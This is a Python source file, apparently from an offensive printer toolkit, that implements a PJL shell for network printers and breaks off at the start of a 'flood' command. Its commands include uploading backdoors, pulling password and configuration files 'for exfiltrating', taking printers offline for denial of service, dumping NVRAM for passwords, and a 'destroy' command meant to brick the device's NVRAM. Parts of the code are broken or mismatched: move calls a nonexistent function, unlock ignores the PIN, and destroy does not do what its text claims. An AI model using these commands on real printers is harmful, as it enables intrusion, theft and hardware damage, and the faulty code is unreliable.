#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import os
import random
import posixpath
import time

from core.printer import printer
from utils.codebook import codebook
from utils.helper import log, output, conv, file, item, chunks, const as c


class pjl(printer):
    """
    PJL v2.0 shell for PrinterReaper - Enhanced and Reorganized
    """

    def __init__(self, args):
        super().__init__(args)
        self.status = False
        self.prompt = f"{self.target}:/> "

    # --------------------------------------------------------------------
    # low-level send/receive

    def cmd(self, str_send, wait=True, crop=True, binary=False):
        """
        Send a PJL command and optionally wait for its reply.
        """
        token = c.DELIMITER + str(random.randrange(2**16))
        status_cmd = "@PJL INFO STATUS" + c.EOL if self.status and wait else ""
        footer = "@PJL ECHO " + token + c.EOL + c.EOL if wait else ""
        payload = c.UEL + str_send + c.EOL + status_cmd + footer + c.UEL

        # log the command
        log().write(self.logfile, str_send + os.linesep)
        # send
        self.send(payload)

        if not wait:
            return ""

        # receive until token with timeout
        try:
            # Set a reasonable timeout for receiving data (30 seconds as requested)
            if hasattr(self.conn, '_sock') and self.conn._sock:
                self.conn._sock.settimeout(30.0)  # 30 second timeout
            
            raw = self.recv(r"(@PJL ECHO\s+)?" + re.escape(token) + r".*$",
                            wait, True, binary)
        except Exception as e:
            output().errmsg(f"Failed to receive response: {str(e)}")
            return ""
        stat = ""
        if self.status:
            stat = item(re.findall(r"@PJL INFO STATUS.*", raw, re.DOTALL))
            raw = re.sub(r"\x0c?@PJL INFO STATUS.*", "", raw, flags=re.DOTALL)
        if crop:
            raw = re.sub(r"^\x04?(\x00+)?@PJL.*" + re.escape(c.EOL), "",
                         raw, flags=re.MULTILINE)

        return self.pjl_err(raw, stat)

    def pjl_err(self, raw, stat):
        """
        Handle file errors and status messages, then return raw buffer.
        """
        self.fileerror(raw)
        self.showstatus(stat)
        return raw

    def on_connect(self, mode):
        """
        Disable unsolicited status messages on first connect.
        """
        if mode == "init":
            self.cmd("@PJL USTATUSOFF", False)

    # --------------------------------------------------------------------
    # status toggles

    def do_status(self, arg):
        "Toggle PJL status messages"
        self.status = not self.status
        print("Status messages enabled" if self.status else "Status messages disabled")

    def help_status(self):
        """Show help for status command"""
        print()
        print("status - Toggle PJL status messages")
        print("Usage: status")
        print("Enables or disables detailed status messages from the printer.")
        print("Useful for debugging and monitoring printer responses.")
        print()


    def showstatus(self, stat):
        codes = {}
        msgs = {}
        for num, code in re.findall(r"CODE(\d+)?\s*=\s*(\d+)", stat):
            codes[num] = code
        for num, mstr in re.findall(r'DISPLAY(\d+)?\s*=\s*"(.*)"', stat):
            msgs[num] = mstr

        for num, code in codes.items():
            message = msgs.get(num, "UNKNOWN STATUS")
            # HP quirk
            if code.startswith("32"):
                code = str(int(code) - 2000)
            err = item(codebook().get_errors(code), "Unknown status")
            output().errmsg(f"CODE {code}: {message}", err)

    # --------------------------------------------------------------------
    # 📁 SISTEMA DE ARQUIVOS (12 comandos)
    # --------------------------------------------------------------------

    def do_ls(self, arg):
        "List remote directory contents"
        lst = self.dirlist(arg, False, True)
        if lst:
            print(lst)

    def help_ls(self):
        """Show help for ls command"""
        print()
        print("ls - List remote directory contents")
        print("Usage: ls [directory]")
        print("Lists files and directories on the remote printer.")
        print("If no directory is specified, lists current directory.")
        print()

    def do_mkdir(self, arg):
        "Create remote directory"
        if not arg:
            output().errmsg("Usage: mkdir <directory>")
            return
        self.cmd("@PJL FSMKDIR NAME=\"" + arg + "\"")

    def help_mkdir(self):
        """Show help for mkdir command"""
        print()
        print("mkdir - Create remote directory")
        print("Usage: mkdir <directory>")
        print("Creates a new directory on the remote printer.")
        print()

    def do_find(self, arg):
        "Recursively list all files"
        self.fswalk(arg, "find")

    def help_find(self):
        """Show help for find command"""
        print()
        print("find - Recursively list all files in the printer's file system")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Walks through the entire directory tree starting from the specified")
        print("  path and lists all files and directories found.")
        print()
        print("USAGE:")
        print("  find [path]")
        print()
        print("EXAMPLES:")
        print("  find                     # List all files from root")
        print("  find 0:/                 # List all files on volume 0")
        print("  find /webServer          # Find files in webServer directory")
        print()
        print("NOTES:")
        print("  - May take time on large filesystems")
        print("  - Shows full path for each file")
        print("  - Useful for discovering hidden files")
        print()

    def do_upload(self, arg):
        "Upload file to printer: upload <local_file> [remote_path]"
        if not arg:
            output().errmsg("Usage: upload <local_file> [remote_path]")
            return
        
        parts = arg.split()
        local_file = parts[0]
        remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_file)
        
        if not os.path.exists(local_file):
            output().errmsg(f"Local file not found: {local_file}")
            return
        
        try:
            with open(local_file, 'rb') as f:
                data = f.read()
            
            # Upload file using PJL FSUPLOAD
            self.cmd(f"@PJL FSUPLOAD NAME=\"{remote_path}\" OFFSET=0 LENGTH={len(data)}")
            self.send(data)
            output().info(f"Uploaded {local_file} to {remote_path}")
        except Exception as e:
            output().errmsg(f"Upload failed: {e}")

    def help_upload(self):
        """Show help for upload command"""
        print()
        print("upload - Upload a local file to the printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Transfers a file from the local system to the printer's file system")
        print("  using PJL FSUPLOAD command. Supports any file type.")
        print()
        print("USAGE:")
        print("  upload <local_file> [remote_path]")
        print()
        print("EXAMPLES:")
        print("  upload config.txt                # Upload to root with same name")
        print("  upload /path/file.cfg 0:/file.cfg  # Upload to specific location")
        print("  upload backdoor.ps 1:/backdoor.ps  # Upload to volume 1")
        print()
        print("NOTES:")
        print("  - Local file must exist and be readable")
        print("  - Remote path is optional (uses basename if omitted)")
        print("  - File size is automatically calculated")
        print("  - Use volume prefix (0:, 1:) for specific volumes")
        print()

    def do_download(self, arg):
        "Download file from printer: download <remote_file> [local_path]"
        if not arg:
            output().errmsg("Usage: download <remote_file> [local_path]")
            return
        
        parts = arg.split()
        remote_file = parts[0]
        local_path = parts[1] if len(parts) > 1 else os.path.basename(remote_file)
        
        try:
            # Download file using PJL FSDOWNLOAD
            data = self.cmd(f"@PJL FSDOWNLOAD NAME=\"{remote_file}\"", binary=True)
            
            # Ensure data is bytes
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            with open(local_path, 'wb') as f:
                f.write(data)
            
            output().info(f"Downloaded {remote_file} to {local_path}")
        except Exception as e:
            output().errmsg(f"Download failed: {e}")

    def help_download(self):
        """Show help for download command"""
        print()
        print("download - Download a file from the printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Retrieves a file from the printer's file system and saves it")
        print("  locally using PJL FSDOWNLOAD command. Supports any file type.")
        print()
        print("USAGE:")
        print("  download <remote_file> [local_path]")
        print()
        print("EXAMPLES:")
        print("  download config.cfg                # Download to current directory")
        print("  download 0:/passwd /tmp/passwd     # Download with different name")
        print("  download 1:/backup.cfg backup.cfg  # Download from volume 1")
        print()
        print("NOTES:")
        print("  - Remote file must exist and be readable")
        print("  - Local path is optional (uses basename if omitted)")
        print("  - File is saved as binary to preserve integrity")
        print("  - Use for exfiltrating configuration files")
        print()

    def do_pjl_delete(self, arg):
        "Delete remote file using PJL: pjl_delete <file>"
        if not arg:
            output().errmsg("Usage: pjl_delete <file>")
            return
        self.cmd("@PJL FSDELETE NAME=\"" + arg + "\"")

    def help_pjl_delete(self):
        """Show help for pjl_delete command"""
        print()
        print("pjl_delete - Delete a file from the printer using PJL")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Removes a file from the printer's file system using the")
        print("  PJL FSDELETE command. Permanent operation - cannot be undone.")
        print()
        print("USAGE:")
        print("  pjl_delete <file>")
        print()
        print("EXAMPLES:")
        print("  pjl_delete old.log           # Delete file from current directory")
        print("  pjl_delete 0:/tmp/temp.cfg   # Delete specific file")
        print("  pjl_delete /webServer/test   # Delete file from webServer")
        print()
        print("NOTES:")
        print("  - File is permanently deleted")
        print("  - Cannot be undone")
        print("  - Use with caution")
        print("  - May be used to remove backdoors or logs")
        print()

    def do_copy(self, arg):
        "Copy remote file: copy <source> <destination>"
        if not arg:
            output().errmsg("Usage: copy <source> <destination>")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            output().errmsg("Usage: copy <source> <destination>")
            return
        
        source, dest = parts
        # Download source and upload as destination
        try:
            data = self.cmd(f"@PJL FSDOWNLOAD NAME=\"{source}\"", binary=True)
            self.cmd(f"@PJL FSUPLOAD NAME=\"{dest}\" OFFSET=0 LENGTH={len(data)}")
            self.send(data)
            output().info(f"Copied {source} to {dest}")
        except Exception as e:
            output().errmsg(f"Copy failed: {e}")

    def help_copy(self):
        """Show help for copy command"""
        print()
        print("copy - Copy a file on the printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Creates a duplicate of a file in the printer's file system")
        print("  by downloading the source and uploading it to the destination.")
        print()
        print("USAGE:")
        print("  copy <source> <destination>")
        print()
        print("EXAMPLES:")
        print("  copy config.cfg config.bak    # Backup configuration")
        print("  copy 0:/file.txt 1:/file.txt  # Copy between volumes")
        print("  copy passwd passwd.original   # Save original passwd file")
        print()
        print("NOTES:")
        print("  - Source file must exist and be readable")
        print("  - Destination will be overwritten if it exists")
        print("  - Uses download + upload internally")
        print("  - Useful for creating backups")
        print()

    def do_move(self, arg):
        "Move remote file: move <source> <destination>"
        if not arg:
            output().errmsg("Usage: move <source> <destination>")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            output().errmsg("Usage: move <source> <destination>")
            return
        
        source, dest = parts
        # Copy and then delete source
        try:
            self.do_copy(f"{source} {dest}")
            self.do_delete(source)
            output().info(f"Moved {source} to {dest}")
        except Exception as e:
            output().errmsg(f"Move failed: {e}")

    def help_move(self):
        """Show help for move command"""
        print()
        print("move - Move/rename a file on the printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Moves a file from one location to another on the printer.")
        print("  Effectively renames the file by copying and deleting the original.")
        print()
        print("USAGE:")
        print("  move <source> <destination>")
        print()
        print("EXAMPLES:")
        print("  move old.cfg new.cfg          # Rename file")
        print("  move 0:/file.txt 1:/file.txt  # Move between volumes")
        print("  move /tmp/test /backup/test   # Move to different directory")
        print()
        print("NOTES:")
        print("  - Source file is deleted after successful copy")
        print("  - Destination will be overwritten if it exists")
        print("  - Use copy if you want to keep the original")
        print("  - Original file is permanently removed")
        print()

    def do_touch(self, arg):
        "Update remote file timestamp, or create it if missing: touch <file>"
        if not arg:
            output().errmsg("Usage: touch <file>")
            return
        
        # Create empty file if it doesn't exist
        try:
            self.cmd(f"@PJL FSUPLOAD NAME=\"{arg}\" OFFSET=0 LENGTH=0")
            output().info(f"Touched {arg}")
        except Exception as e:
            output().errmsg(f"Touch failed: {e}")

    def help_touch(self):
        """Show help for touch command"""
        print()
        print("touch - Create an empty file or update timestamp")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Creates a new empty file on the printer or updates the")
        print("  timestamp of an existing file (if supported by the printer).")
        print()
        print("USAGE:")
        print("  touch <file>")
        print()
        print("EXAMPLES:")
        print("  touch newfile.txt           # Create empty file")
        print("  touch 0:/marker             # Create marker file")
        print("  touch /tmp/test.log         # Create empty log")
        print()
        print("NOTES:")
        print("  - Creates a zero-length file")
        print("  - File is created if it doesn't exist")
        print("  - Some printers may update timestamp instead")
        print("  - Useful for creating placeholder files")
        print()

    def do_chmod(self, arg):
        "Change file permissions: chmod <permissions> <file>"
        if not arg:
            output().errmsg("Usage: chmod <permissions> <file>")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            output().errmsg("Usage: chmod <permissions> <file>")
            return
        
        perms, file_path = parts
        # PJL doesn't have direct chmod, but we can try to set attributes
        try:
            self.cmd(f"@PJL FSSETATTR NAME=\"{file_path}\" ATTR={perms}")
            output().info(f"Changed permissions of {file_path} to {perms}")
        except Exception as e:
            output().errmsg(f"Chmod failed: {e}")

    def help_chmod(self):
        """Show help for chmod command"""
        print()
        print("chmod - Change file permissions")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Attempts to change file permissions on the printer using")
        print("  PJL FSSETATTR command. Support varies by printer model.")
        print()
        print("USAGE:")
        print("  chmod <permissions> <file>")
        print()
        print("EXAMPLES:")
        print("  chmod 644 config.cfg        # Set read/write for owner")
        print("  chmod 755 script.sh         # Set executable permissions")
        print("  chmod 0 protected.txt       # Remove all permissions")
        print()
        print("NOTES:")
        print("  - Not all printers support chmod")
        print("  - Permission format may vary by printer")
        print("  - Use permissions command to test access")
        print("  - Some printers ignore this command")
        print()

    def do_permissions(self, arg):
        "Test file permissions on remote device"
        if not arg:
            output().errmsg("Usage: permissions <file>")
            return
        
        try:
            # Try to access file to test permissions
            result = self.cmd(f"@PJL FSQUERY NAME=\"{arg}\"")
            if result:
                output().info(f"File {arg} is accessible")
            else:
                output().errmsg(f"File {arg} is not accessible")
        except Exception as e:
            output().errmsg(f"Permission test failed: {e}")

    def help_permissions(self):
        """Show help for permissions command"""
        print()
        print("permissions - Test file permissions")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Tests whether a file is accessible on the printer by")
        print("  attempting to query it using PJL FSQUERY command.")
        print()
        print("USAGE:")
        print("  permissions <file>")
        print()
        print("EXAMPLES:")
        print("  permissions config.cfg      # Test if file is accessible")
        print("  permissions /etc/passwd     # Test sensitive file access")
        print("  permissions 0:/protected    # Test protected file")
        print()
        print("NOTES:")
        print("  - Reports if file is accessible or not")
        print("  - Useful for permission enumeration")
        print("  - Does not show specific permission bits")
        print("  - Part of security testing toolkit")
        print()

    def do_rmdir(self, arg):
        "Remove remote directory: rmdir <directory>"
        if not arg:
            output().errmsg("Usage: rmdir <directory>")
            return
        self.cmd("@PJL FSDELETE NAME=\"" + arg + "\"")

    def help_rmdir(self):
        """Show help for rmdir command"""
        print()
        print("rmdir - Remove a directory")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Deletes a directory from the printer's file system using")
        print("  PJL FSDELETE command. Directory must be empty.")
        print()
        print("USAGE:")
        print("  rmdir <directory>")
        print()
        print("EXAMPLES:")
        print("  rmdir olddir                # Remove empty directory")
        print("  rmdir 0:/tmp                # Remove tmp directory")
        print("  rmdir /backup               # Remove backup folder")
        print()
        print("NOTES:")
        print("  - Directory must be empty")
        print("  - Use pjl_delete to remove files first")
        print("  - Operation cannot be undone")
        print("  - Some printers may not support this")
        print()

    def do_mirror(self, arg):
        "Mirror remote filesystem locally"
        print("Mirroring " + c.SEP + self.vpath(arg))
        self.fswalk(arg, "mirror")

    def help_mirror(self):
        """Show help for mirror command"""
        print()
        print("mirror - Mirror the printer's filesystem locally")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Recursively downloads the entire directory tree from the printer")
        print("  to create a local copy. Useful for forensics and backup.")
        print()
        print("USAGE:")
        print("  mirror [path]")
        print()
        print("EXAMPLES:")
        print("  mirror                      # Mirror entire filesystem")
        print("  mirror 0:/                  # Mirror volume 0")
        print("  mirror /webServer           # Mirror webServer directory only")
        print()
        print("NOTES:")
        print("  - Creates local directory structure")
        print("  - Downloads all accessible files")
        print("  - May take considerable time")
        print("  - Useful for offline analysis and forensics")
        print("  - Preserves directory structure")
        print()

    # --------------------------------------------------------------------
    # ℹ️ INFORMAÇÕES DO SISTEMA (3 comandos)
    # --------------------------------------------------------------------

    def do_id(self, *args):
        "Show comprehensive printer identification and system information (PJL-specific)"
        print("PJL Printer Identification & System Information:")
        print("=" * 60)
        
        # Get basic ID
        id_info = self.cmd("@PJL INFO ID")
        if id_info:
            print(f"Device ID: {id_info.strip()}")
        
        # Get version/firmware info
        version_info = self.cmd("@PJL INFO CONFIG")
        if version_info:
            print("\nFirmware/Version Information:")
            print(version_info)
        
        # Get product details
        product_info = self.cmd("@PJL INFO PRODUCT")
        if product_info:
            print("\nProduct Information:")
            print(product_info)
        
        # Get page count
        pagecount = self.cmd("@PJL INFO PAGECOUNT")
        if pagecount:
            print(f"\nPage Count: {pagecount.strip()}")

    def help_id(self):
        """Show help for id command"""
        print()
        print("id - Show comprehensive printer identification and system information")
        print("Usage: id")
        print("Displays device ID, firmware version, product information, and page count.")
        print("This is the main command for getting printer identification details.")
        print()

    def do_variables(self, arg):
        "Show environment variables"
        resp = self.cmd("@PJL INFO VARIABLES")
        if resp:
            print(resp)

    def help_variables(self):
        """Show help for variables command"""
        print()
        print("variables - Show environment variables")
        print("Usage: variables")
        print("Displays all environment variables configured on the printer.")
        print()

    def do_printenv(self, arg):
        "Show specific environment variable"
        if not arg:
            output().errmsg("Usage: printenv <variable>")
            return
        
        resp = self.cmd("@PJL INFO VARIABLES")
        if resp:
            # Search for specific variable
            lines = resp.split('\n')
            for line in lines:
                if arg.upper() in line.upper():
                    print(line)

    def help_printenv(self):
        """Show help for printenv command"""
        print()
        print("printenv - Show specific environment variable")
        print("Usage: printenv <variable>")
        print("Displays the value of a specific environment variable.")
        print("Example: printenv PAGECOUNT")
        print()

    # --------------------------------------------------------------------
    # ⚙️ CONTROLE E CONFIGURAÇÃO (8 comandos)
    # --------------------------------------------------------------------

    def do_set(self, arg, fb=True):
        "Set environment variable VAR=VALUE"
        if not arg:
            output().errmsg("Usage: set <variable>=<value>")
            return
        
        if "=" not in arg:
            output().errmsg("Usage: set <variable>=<value>")
            return
        
        var, value = arg.split("=", 1)
        self.cmd("@PJL SET " + var.upper() + "=" + value)

    def help_set(self):
        """Show help for set command"""
        print()
        print("set - Set environment variable")
        print("Usage: set <variable>=<value>")
        print("Sets an environment variable on the printer.")
        print("Example: set TESTVAR=testvalue")
        print()

    def do_display(self, arg):
        "Set printer's display message: display <message>"
        if not arg:
            try:
                message = input("Message: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No message provided")
                return
        else:
            message = arg
        
        self.cmd("@PJL DISPLAY \"" + message + "\"")

    def help_display(self):
        """Show help for display command"""
        print()
        print("display - Set printer's display message")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Changes the message shown on the printer's control panel display.")
        print("  Useful for sending messages or testing display functionality.")
        print()
        print("USAGE:")
        print("  display <message>")
        print()
        print("EXAMPLES:")
        print("  display 'System Maintenance'     # Show maintenance message")
        print("  display 'Printer hacked'         # Demonstration message")
        print("  display 'Out of service'         # Service notice")
        print()
        print("NOTES:")
        print("  - Message length limited by printer")
        print("  - Some printers ignore this command")
        print("  - Can be used for social engineering")
        print("  - Display reverts after timeout or job")
        print()

    def do_offline(self, arg):
        "Take printer offline and display message: offline <message>"
        if not arg:
            try:
                message = input("Message: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No message provided")
                return
        else:
            message = arg
        
        self.cmd("@PJL OFFLINE \"" + message + "\"")

    def help_offline(self):
        """Show help for offline command"""
        print()
        print("offline - Take printer offline with custom message")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Takes the printer offline and displays a custom message on the")
        print("  control panel. Printer will not accept new jobs until brought back online.")
        print()
        print("USAGE:")
        print("  offline <message>")
        print()
        print("EXAMPLES:")
        print("  offline 'Under maintenance'      # Maintenance mode")
        print("  offline 'Reserved for testing'   # Reserve printer")
        print("  offline 'System upgrade'         # Upgrade notice")
        print()
        print("NOTES:")
        print("  - Printer stops accepting jobs")
        print("  - User must manually bring printer online")
        print("  - Can be used for denial of service")
        print("  - Some printers may ignore this command")
        print()

    def do_restart(self, arg):
        "Restart printer"
        output().raw("Restarting printer...")
        self.cmd("@PJL RESET", False)

    def help_restart(self):
        """Show help for restart command"""
        print()
        print("restart - Restart the printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Performs a soft reset of the printer, restarting the print")
        print("  engine and reinitializing all settings. Clears current job queue.")
        print()
        print("USAGE:")
        print("  restart")
        print()
        print("EXAMPLES:")
        print("  restart                          # Restart printer")
        print()
        print("NOTES:")
        print("  - All queued jobs will be lost")
        print("  - Printer will be offline during restart")
        print("  - Settings are preserved (not factory reset)")
        print("  - Takes 30-60 seconds to complete")
        print("  - Use reset for factory defaults")
        print()

    def do_reset(self, arg):
        "Reset to factory defaults"
        if not self.conn._file:  # in case we're connected over inet socket
            output().warning("Reset command may not work over network connection")
        
        output().warning("This will reset the printer to factory defaults!")
        confirm = input("Are you sure? (yes/no): ")
        if confirm.lower() == 'yes':
            self.cmd("@PJL DEFAULT", False)
            output().info("Printer reset to factory defaults")
        else:
            output().info("Reset cancelled")

    def help_reset(self):
        """Show help for reset command"""
        print()
        print("reset - Reset printer to factory defaults")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Resets all printer settings to factory defaults. This is a")
        print("  destructive operation that cannot be undone. All custom settings,")
        print("  network configurations, and stored data will be lost.")
        print()
        print("USAGE:")
        print("  reset")
        print()
        print("EXAMPLES:")
        print("  reset                            # Reset to factory defaults")
        print()
        print("NOTES:")
        print("  - Requires confirmation (type 'yes')")
        print("  - All settings will be lost")
        print("  - Network configuration will be reset")
        print("  - Cannot be undone")
        print("  - Use restart for simple reboot")
        print("  - Printer will need reconfiguration")
        print()

    def do_selftest(self, arg):
        "Perform various printer self-tests"
        print("Available self-tests:")
        print("1. Print test page")
        print("2. Network test")
        print("3. Memory test")
        print("4. All tests")
        
        try:
            choice = input("Select test (1-4): ")
        except (EOFError, KeyboardInterrupt):
            output().errmsg("No test selected")
            return
        
        if choice == "1":
            self.cmd("@PJL TESTPAGE")
        elif choice == "2":
            self.cmd("@PJL NETTEST")
        elif choice == "3":
            self.cmd("@PJL MEMTEST")
        elif choice == "4":
            self.cmd("@PJL SELFTEST")
        else:
            output().errmsg("Invalid choice")

    def help_selftest(self):
        """Show help for selftest command"""
        print()
        print("selftest - Perform printer self-tests")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Runs various diagnostic tests on the printer to verify")
        print("  functionality. Includes print test, network test, memory test.")
        print()
        print("USAGE:")
        print("  selftest")
        print()
        print("TEST OPTIONS:")
        print("  1. Print test page    - Tests print engine")
        print("  2. Network test       - Tests network connectivity")
        print("  3. Memory test        - Tests RAM integrity")
        print("  4. All tests          - Runs complete diagnostic suite")
        print()
        print("EXAMPLES:")
        print("  selftest                         # Interactive test selection")
        print()
        print("NOTES:")
        print("  - Tests may take several minutes")
        print("  - Test page will be printed for option 1")
        print("  - Some printers have limited test support")
        print("  - Useful for troubleshooting hardware issues")
        print()

    def do_backup(self, arg):
        "Backup printer configuration"
        if not arg:
            output().errmsg("Usage: backup <filename>")
            return
        
        try:
            # Get configuration
            config = self.cmd("@PJL INFO CONFIG")
            if config:
                with open(arg, 'w') as f:
                    f.write(config)
                output().info(f"Configuration backed up to {arg}")
            else:
                output().errmsg("Failed to get configuration")
        except Exception as e:
            output().errmsg(f"Backup failed: {e}")

    def help_backup(self):
        """Show help for backup command"""
        print()
        print("backup - Backup printer configuration")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Retrieves the current printer configuration and saves it to")
        print("  a local file. Useful for backup before making changes.")
        print()
        print("USAGE:")
        print("  backup <filename>")
        print()
        print("EXAMPLES:")
        print("  backup config.backup             # Save configuration")
        print("  backup printer_$(date).cfg       # Timestamped backup")
        print("  backup /backups/printer.cfg      # Full path backup")
        print()
        print("NOTES:")
        print("  - Saves current configuration to local file")
        print("  - Does not include print jobs")
        print("  - Use before making risky changes")
        print("  - Use restore to apply backed up configuration")
        print()

    def do_restore(self, arg):
        "Restore printer configuration from backup"
        if not arg:
            output().errmsg("Usage: restore <filename>")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"Backup file not found: {arg}")
            return
        
        try:
            with open(arg, 'r') as f:
                config = f.read()
            
            # Restore configuration (this is a simplified approach)
            output().warning("Restore functionality requires manual configuration")
            output().info(f"Configuration from {arg} loaded")
        except Exception as e:
            output().errmsg(f"Restore failed: {e}")

    def help_restore(self):
        """Show help for restore command"""
        print()
        print("restore - Restore printer configuration from backup")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Loads a previously saved printer configuration from a backup")
        print("  file. Note: automatic restoration may not be supported on all printers.")
        print()
        print("USAGE:")
        print("  restore <filename>")
        print()
        print("EXAMPLES:")
        print("  restore config.backup            # Restore from backup")
        print("  restore /backups/printer.cfg     # Restore from path")
        print()
        print("NOTES:")
        print("  - Backup file must exist")
        print("  - Manual configuration may be required")
        print("  - Not all settings may be restorable via PJL")
        print("  - Test in safe environment first")
        print("  - May require printer restart")
        print()

    # --------------------------------------------------------------------
    # 🔒 SEGURANÇA E ACESSO (4 comandos)
    # --------------------------------------------------------------------

    def do_lock(self, arg):
        "Lock control panel settings and disk write access"
        if not arg:
            try:
                pin = input("Enter PIN (1..65535): ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No PIN provided")
                return
        else:
            pin = arg
        
        try:
            pin_num = int(pin)
            if 1 <= pin_num <= 65535:
                self.cmd("@PJL SET LOCKPIN=" + pin)
                output().info("Printer locked with PIN")
            else:
                output().errmsg("PIN must be between 1 and 65535")
        except ValueError:
            output().errmsg("Invalid PIN format")

    def help_lock(self):
        """Show help for lock command"""
        print()
        print("lock - Lock printer control panel and disk access")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sets a PIN code to lock the printer's control panel settings")
        print("  and restrict disk write access. Prevents unauthorized changes.")
        print()
        print("USAGE:")
        print("  lock [PIN]")
        print()
        print("EXAMPLES:")
        print("  lock 12345                       # Lock with PIN 12345")
        print("  lock                             # Prompt for PIN")
        print()
        print("NOTES:")
        print("  - PIN must be between 1 and 65535")
        print("  - Remember the PIN - recovery may not be possible")
        print("  - Use unlock command to remove lock")
        print("  - Some printers don't support this feature")
        print("  - Can be used for security or denial of service")
        print()

    def do_unlock(self, arg):
        "Unlock control panel settings and disk write access"
        if not arg:
            try:
                pin = input("Enter PIN: ")
            except (EOFError, KeyboardInterrupt):
                output().errmsg("No PIN provided")
                return
        else:
            pin = arg
        
        self.cmd("@PJL SET LOCKPIN=0")
        output().info("Printer unlocked")

    def help_unlock(self):
        """Show help for unlock command"""
        print()
        print("unlock - Unlock printer control panel and disk access")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Removes the PIN code lock from the printer, restoring normal")
        print("  access to control panel and disk write operations.")
        print()
        print("USAGE:")
        print("  unlock [PIN]")
        print()
        print("EXAMPLES:")
        print("  unlock 12345                     # Unlock with PIN 12345")
        print("  unlock                           # Prompt for PIN")
        print()
        print("NOTES:")
        print("  - Correct PIN required (or try brute force)")
        print("  - Setting PIN to 0 removes lock")
        print("  - Use unlock_bruteforce for PIN recovery")
        print("  - Some printers have limited unlock support")
        print()

    def do_disable(self, arg):
        "Disable printer functionality"
        jobmedia = self.cmd("@PJL DINQUIRE JOBMEDIA") or "?"
        if "?" in jobmedia:
            output().errmsg("Job media inquiry failed")
            return
        
        if "ON" in jobmedia:
            self.cmd("@PJL SET JOBMEDIA=OFF")
            output().info("Job media disabled")
        else:
            output().info("Job media already disabled")

    def do_nvram(self, arg):
        "Access/manipulate NVRAM"
        if not arg:
            output().errmsg("Usage: nvram <dump|set|get> [options]")
            return
        
        if arg.startswith("dump"):
            # Dump NVRAM
            nvram_data = self.cmd("@PJL INFO NVRAM")
            if nvram_data:
                print("NVRAM Contents:")
                print("=" * 50)
                print(nvram_data)
            else:
                output().errmsg("Failed to dump NVRAM")
        elif arg.startswith("set"):
            output().warning("NVRAM modification not implemented")
        elif arg.startswith("get"):
            output().warning("NVRAM reading not implemented")
        else:
            output().errmsg("Unknown NVRAM operation")

    def help_nvram(self):
        """Show help for nvram command"""
        print()
        print("nvram - Access and manipulate NVRAM")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Accesses the printer's non-volatile RAM (NVRAM) which stores")
        print("  settings, passwords, and configuration data.")
        print()
        print("USAGE:")
        print("  nvram <dump|set|get> [options]")
        print()
        print("OPERATIONS:")
        print("  dump  - Dump entire NVRAM contents")
        print("  set   - Set NVRAM value (not implemented)")
        print("  get   - Get NVRAM value (not implemented)")
        print()
        print("EXAMPLES:")
        print("  nvram dump                       # Dump all NVRAM")
        print()
        print("NOTES:")
        print("  - May contain sensitive information")
        print("  - Passwords may be stored in NVRAM")
        print("  - Useful for information disclosure")
        print("  - Some data may be encrypted")
        print()

    # --------------------------------------------------------------------
    # 💥 ATAQUES E TESTES (4 comandos)
    # --------------------------------------------------------------------

    def do_destroy(self, arg):
        "Cause physical damage to printer's NVRAM"
        output().warning("Warning: This command tries to cause physical damage to the")
        output().warning("printer's NVRAM. Use with caution!")
        
        try:
            confirm = input("Are you sure you want to continue? (yes/no): ")
            if confirm.lower() == 'yes':
                # This is a destructive command - be very careful
                output().warning("Executing destructive command...")
                
                # Check for interruption during execution with better control
                for i in range(10):  # Simulate long operation
                    if hasattr(self, 'interrupted') and self.interrupted:
                        output().warning("Command interrupted by user")
                        return
                    # Check for keyboard interrupt more frequently
                    try:
                        time.sleep(0.1)  # Small delay to allow interruption
                    except KeyboardInterrupt:
                        output().warning("Command interrupted by user")
                        return
                
                self.cmd("@PJL SET NVRAM=0", False)
                output().warning("Destructive command executed")
            else:
                output().info("Destructive command cancelled")
        except (EOFError, KeyboardInterrupt):
            output().info("Command cancelled")

    def help_destroy(self):
        """Show help for destroy command"""
        print()
        print("destroy - Attempt to cause physical damage to NVRAM")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  **DESTRUCTIVE ATTACK** - Attempts to cause physical damage")
        print("  to the printer's NVRAM by repeatedly writing invalid data.")
        print("  May permanently damage the printer.")
        print()
        print("USAGE:")
        print("  destroy")
        print()
        print("EXAMPLES:")
        print("  destroy                          # Execute destructive attack")
        print()
        print("WARNINGS:")
        print("  ⚠️  MAY CAUSE PERMANENT HARDWARE DAMAGE")
        print("  ⚠️  CANNOT BE UNDONE")
        print("  ⚠️  FOR RESEARCH PURPOSES ONLY")
        print("  ⚠️  REQUIRES EXPLICIT CONFIRMATION")
        print()
        print("NOTES:")
        print("  - Use only in authorized testing")
        print("  - May brick the printer")
        print("  - Requires 'yes' confirmation")
        print()

    def do_flood(self, arg):
        "Flood user input, may reveal buffer overflows: flood <size>"
